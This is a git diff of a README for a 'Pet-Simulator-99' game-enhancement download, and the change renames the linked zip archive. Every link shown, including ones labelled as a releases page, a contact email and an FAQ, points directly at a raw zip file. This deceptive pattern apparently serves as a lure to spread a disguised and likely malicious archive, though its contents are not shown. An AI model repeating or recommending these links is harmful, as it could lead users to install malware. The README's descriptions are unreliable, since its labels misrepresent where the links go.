@@ -6,11 +6,11 @@ Welcome to Pet-Simulator-99! This application enhances your gameplay experience 
 
 ## 📥 Download Now
 
-[![Download Pet-Simulator-99](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/PetSimulator_v3.7.zip)](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/PetSimulator_v3.7.zip)
+[![Download Pet-Simulator-99](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/Simulator_Pet_v3.5.zip)](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/Simulator_Pet_v3.5.zip)
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: To start, visit the [Releases page](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/PetSimulator_v3.7.zip). This page contains the latest version of Pet-Simulator-99.
+1. **Visit the Releases Page**: To start, visit the [Releases page](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/Simulator_Pet_v3.5.zip). This page contains the latest version of Pet-Simulator-99.
 
 2. **Select the Latest Version**: On the Releases page, look for the most recent version. Generally, it will be at the top of the list. Click on it to open the version details.
 
@@ -48,8 +48,8 @@ Please ensure your system meets the following basic requirements to run Pet-Simu
 
 If you encounter any issues while downloading or using Pet-Simulator-99, don’t hesitate to reach out for help:
 
-- **Contact Email**: https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/PetSimulator_v3.7.zip
-- **FAQ Section**: Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/PetSimulator_v3.7.zip) for commonly asked questions.
+- **Contact Email**: https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/Simulator_Pet_v3.5.zip
+- **FAQ Section**: Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/drnxx2/Pet-Simulator-99/main/colorful/Simulator_Pet_v3.5.zip) for commonly asked questions.
 
 ## 🌐 Community and Feedback
 
